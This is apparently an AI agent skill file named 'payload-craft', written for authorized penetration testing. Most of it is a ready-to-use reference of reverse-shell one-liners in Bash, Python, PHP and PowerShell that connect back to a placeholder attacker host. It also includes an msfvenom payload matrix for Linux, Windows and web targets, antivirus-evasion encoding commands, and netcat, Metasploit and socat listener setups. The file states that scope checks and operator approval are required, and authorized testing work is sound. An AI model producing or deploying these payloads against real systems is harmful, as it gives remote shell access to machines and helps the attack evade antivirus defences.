---
name: payload-craft
description: >
  Custom payload generation, encoding, obfuscation, and delivery mechanism
  design for authorized penetration testing. Use this skill when the user
  mentions payload generation, msfvenom, reverse shell, bind shell, web shell,
  shellcode, payload encoding, AV evasion, payload obfuscation, custom exploit
  payload, stager, stageless, meterpreter payload, shell payload, PowerShell
  payload, Python payload, macro payload, HTA payload, or any request to
  generate code that establishes remote access on an authorized target.
  Also trigger for: "generate a reverse shell", "create a payload for",
  "encode this payload", "bypass AV", "craft a dropper", "listener setup",
  or any payload engineering task during an authorized engagement.
  Expert tools: msfvenom (Metasploit payloads), custom Python/Bash generators.
  CRITICAL: All payloads are for authorized testing only. Operator confirms
  target and scope before any payload is deployed.
compatibility:
  tools: [bash, python]
  mcps: [desktop-commander, hexstrike]
  skills: [exploit-dev, scope-guard]
---

# Payload Craft Skill

## Overview

Generates, encodes, and prepares payloads for authorized penetration testing.
Covers reverse shells, bind shells, web shells, encoded payloads, and custom
delivery mechanisms. All payloads require scope-guard validation and operator
approval before deployment.

## Quick Reference — Common Payloads

### Reverse Shells (one-liners for manual use)
```bash
# Bash
bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
```

### msfvenom Payload Matrix

| Target OS | Payload | Format | Command |
|-----------|---------|--------|---------|
| Linux x64 | Reverse TCP | ELF | `msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf` |
| Linux x64 | Meterpreter | ELF | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o met.elf` |
| Windows x64 | Reverse TCP | EXE | `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe` |
| Windows x64 | Meterpreter | EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o met.exe` |
| PHP | Reverse PHP | Raw | `msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw -o shell.php` |
| JSP | Reverse TCP | War | `msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war` |
| Python | Reverse TCP | Raw | `msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw` |
| ASP | Meterpreter | ASPX | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx` |

### Encoding & Evasion

```bash
# XOR encoding (basic)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} \
  -e x64/xor_dynamic -i 3 -f exe -o encoded.exe

# Shikata ga nai (polymorphic, x86 only)
msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} \
  -e x86/shikata_ga_nai -i 5 -f exe -o sgn.exe
```

### Listener Setup

```bash
# Netcat
nc -lvnp {LPORT}

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {ip}; set LPORT {port}; exploit -j"

# Socat (encrypted)
socat OPENSSL-LISTEN:{port},cert=server.pem,verify=0,fork EXEC:/bin/bash
```

## Output Checklist

- [ ] Payload matches target OS and architecture
- [ ] Scope-guard validated target before deployment
- [ ] Operator approved payload type and delivery method
- [ ] Listener configured and verified before payload execution
- [ ] Payload file saved to /tmp/pentest/{target}/payloads/
- [ ] All payload generation logged to audit trail
